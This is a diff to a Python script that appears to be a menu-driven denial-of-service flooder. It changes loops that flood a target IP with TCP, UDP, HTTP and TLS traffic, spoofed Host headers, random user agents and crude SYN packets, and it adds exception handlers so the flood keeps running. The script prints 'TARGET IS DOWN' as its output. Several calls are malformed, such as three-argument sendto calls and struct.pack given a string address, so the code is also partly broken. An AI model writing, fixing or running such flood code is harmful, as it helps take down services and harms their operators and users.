@@ -3549,13 +3549,13 @@ elif answer == ("20"):
                         t = str(ip)
                         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                         s.connect((t,port))
-                        s.send(("GET /"+ip+" HTTP/1.1\r\nHost: "+random.choice(fake)+"\r\n").encode('ascii'))
+                        s.send(("GET /"+t+" HTTP/1.1\r\nHost: "+random.choice(fake)+"\r\n").encode('ascii'))
                         s.sendto(byte,(ip,port))
                         for i in range(bps):
                             udp.sendto(byte, (ip,port))
-                            udp.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n").encode('utf-8'), (ip,port))
+                            udp.sendto(byte,("GET "+t+" HTTP/1.1\r\nHost: "+random.choice(fake)+"\r\nUser-Agent: "+random.choice(ua)+"\r\n").encode('utf-8'), (ip,port))
                             http.sendto(byte, (ip,port))
-                            tls.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n"))
+                            tls.sendto(byte,("GET "+t+" HTTP/1.1\r\nHost: "+random.choice(fake)+"\r\nUser-Agent: "+random.choice(ua)+"\r\n"))
                             pack = "SYN\x00"
                             pack_len = len(pack)
                             tcp_syn_packet = pack + struct.pack("!i", ip, port) + struct.pack("!i", ip, port)
@@ -3570,6 +3570,10 @@ elif answer == ("20"):
                         count += 1
                         print(Fore.LIGHTRED_EX+'TARGET IS DOWN : ERR.CONNECTION.TIMEOUT                             ', end='\r')
                     except TypeError:
+                        continue
+                    except OSError:
+                        continue
+                    except socket.gaierror:
                         continue
                     except:
                         udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -3592,13 +3596,13 @@ elif answer == ("20"):
                         t = str(ip)
                         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                         s.connect((t,port))
-                        s.send(("GET /"+ip+" HTTP/1.1\r\nHost: "+random.choice(fake)+"\r\n").encode('ascii'))
+                        s.send(("GET /"+t+" HTTP/1.1\r\nHost: "+random.choice(fake)+"\r\n").encode('ascii'))
                         s.sendto(byte,(ip,port))
                         for i in range(bps):
                             udp.sendto(byte, (ip,port))
-                            udp.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n").encode('utf-8'), (ip,port))
+                            udp.sendto(byte,("GET "+t+" HTTP/1.1\r\nHost: "+random.choice(fake)+"\r\nUser-Agent: "+random.choice(ua)+"\r\n").encode('utf-8'), (ip,port))
                             http.sendto(byte, (ip,port))
-                            tls.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n"))
+                            tls.sendto(byte,("GET "+t+" HTTP/1.1\r\nHost: "+random.choice(fake)+"\r\nUser-Agent: "+random.choice(ua)+"\r\n"))
                             pack = "SYN\x00"
                             pack_len = len(pack)
                             tcp_syn_packet = pack + struct.pack("!i", ip, port) + struct.pack("!i", ip, port)
